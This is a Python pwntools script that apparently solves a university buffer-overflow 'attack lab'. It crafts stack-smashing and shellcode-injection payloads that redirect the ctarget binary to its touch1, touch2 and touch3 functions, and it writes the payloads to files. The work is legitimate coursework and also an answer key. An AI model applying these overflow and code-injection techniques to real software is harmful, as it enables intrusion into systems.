from pwn import *

e = ELF("/home/ubuntu/workspace/lab3/ctarget")

get_buf = e.symbols["getbuf"]
touch1 = e.symbols["touch1"]
touch2 = e.symbols["touch2"]
touch3 = e.symbols["touch3"]
# print(ELF.disasm(e, get_buf, 0x100))

# 0x38 padding + ret addr
# 0x38 = 6*8+8 = 56 bytes


print(f"target1: {hex(touch1)}")
# gets = 0x401fdb
# print(ELF.disasm(e, gets, 0x50))

# payload_str = b"A" * 0x38 + p64(touch1)
# with open("payload", "wb") as f:
#     f.write(payload_str)


print(f"target2: {hex(touch2)}")
# print(ELF.disasm(e, touch2, 0x100))

cookie = 0x7f7639c5
charstart = 0x55643a70
context.arch = "amd64"
set_cookie = asm("mov edi, 0x7f7639c5") + asm("ret") + asm("ret") + asm("ret")  # 8 bytes
payload_str = set_cookie * 5 + p64(touch2) + p64(charstart)+ p64(charstart)+ p64(charstart)+ p64(touch2)+ p64(charstart)

def to_hex(s):
    return " ".join(f"{b:02x}" for b in s)
print(to_hex(payload_str))
print(hex(len(payload_str)))

# with open("payload2", "wb") as f:
#     f.write(payload_str)


print(f"target3: {hex(touch3)}")
# payload_offset = 0x55643a68
# charstart = payload_offset
# cookiestart = payload_offset + 0x58 + 16*100
# cookie_str = b"7f7639c5\0"
# set_edi = asm(f"mov edi, 0x{cookiestart:x}") + asm("ret") + asm("ret") + asm("ret")  # 8 bytes

# # payload_str = p64(0) + p64(0) + cookie_str + set_edi + b"A" * (0x20-9)  + p64(charstart) + p64(touch3) # intentionally crash
# payload_str = set_edi + b"\0" * (0x30)  + p64(charstart) + p64(touch3) + p64(charstart) + p64(touch3) + p64(0) * 100 + cookie_str

# print(to_hex(payload_str))
# print(hex(len(payload_str)))

payload_offset = 0x55643a68
charstart = payload_offset + 9
cookiestart = payload_offset
cookie_str = b"7f7639c5\0"
set_edi = asm(f"mov edi, 0x{cookiestart:x}") + asm(f"push 0x{touch3:x}") + asm("ret") 

# payload_str = p64(0) + p64(0) + cookie_str + set_edi + b"A" * (0x20-9)  + p64(charstart) + p64(touch3) # intentionally crash
payload_str =  cookie_str+ set_edi +b"\0" * (0x24)+ p64(charstart)#+ p64(0) * 100 #+ p64(charstart) + p64(touch3)

print(to_hex(payload_str))
print(hex(len(payload_str)))

with open("payload3", "wb") as f:
    f.write(payload_str)
